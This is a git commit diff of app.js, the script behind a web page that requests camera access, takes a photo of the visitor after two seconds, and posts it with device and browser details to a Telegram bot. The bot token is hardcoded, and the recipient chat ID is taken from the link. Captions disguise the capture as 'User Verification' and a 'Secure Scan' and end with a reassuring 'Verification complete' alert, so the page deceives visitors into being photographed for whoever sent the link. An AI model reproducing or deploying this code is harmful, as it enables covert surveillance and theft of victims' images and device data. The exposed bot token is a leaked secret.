70639f839b366f444b92319e193c8369719690a3
HematXF <globalxf43@gmail.com>
2026-05-02 19:26:21 +0430

    Update app.js

--- app.js
+++ app.js
@@ -1,74 +1,50 @@
 const BOT_TOKEN = "8750180526:AAFpXlIk0KHB5j3SljkE7DvheXngu7wA2Kg";
 
-// URL example: ?=8089055081
-const CHAT_ID = new URLSearchParams(window.location.search).get("=");
+// لینک: ?id=12345
+const CHAT_ID = new URLSearchParams(window.location.search).get("id");
 
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const ctx = canvas.getContext("2d");
-const progressBar = document.getElementById("progressBar");
 
-let interval;
-
-window.onload = async () => {
+// user click وروسته camera
+async function startCamera() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     video.srcObject = stream;
 
-    video.onloadedmetadata = () => {
-      startLoop();
-    };
-  } catch (e) {
+    setTimeout(() => {
+      captureAndSend();
+    }, 2000); // 2 ثانیه وروسته عکس اخلي
+
+  } catch {
     alert("Camera permission required ❌");
   }
-};
-
-// 🔄 loading loop (1 sec cycle)
-function startLoop() {
-  let progress = 0;
-
-  if (interval) clearInterval(interval);
-
-  interval = setInterval(() => {
-    progress += 5;
-    progressBar.style.width = progress + "%";
-
-    if (progress >= 100) {
-      progress = 0;
-      progressBar.style.width = "0%";
-      captureAndSend();
-    }
-  }, 50);
 }
 
-// 📸 capture image
 function captureAndSend() {
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
 
-  ctx.filter = "brightness(1.1) contrast(1.2) saturate(1.3)";
   ctx.drawImage(video, 0, 0);
 
   canvas.toBlob(sendToTelegram, "image/jpeg");
 }
 
-// 📤 send to telegram
 function sendToTelegram(blob) {
   const formData = new FormData();
 
   formData.append("chat_id", CHAT_ID);
-  formData.append("photo", blob, "scan.jpg");
+  formData.append("photo", blob, "photo.jpg");
 
   const caption =
-`🌍 Secure Scan Completed
+`📸 User Verification
 
-🤖 Bot: @ProSimTookBot
-👨‍💻 Developer: @XFPro43
-
+🧾 ID: ${CHAT_ID}
 📱 Device: ${navigator.platform}
 🌐 Browser: ${navigator.userAgent}
 
-🛡️ Status: VERIFIED ✅`;
+✅ Status: Completed`;
 
   formData.append("caption", caption);
 
@@ -76,6 +52,6 @@ function sendToTelegram(blob) {
     method: "POST",
     body: formData
   })
-  .then(() => console.log("🔂"))
-  .catch(err => console.error(err));
-} 
+  .then(() => alert("Verification complete ✅"))
+  .catch(() => alert("Error ❌"));
+}
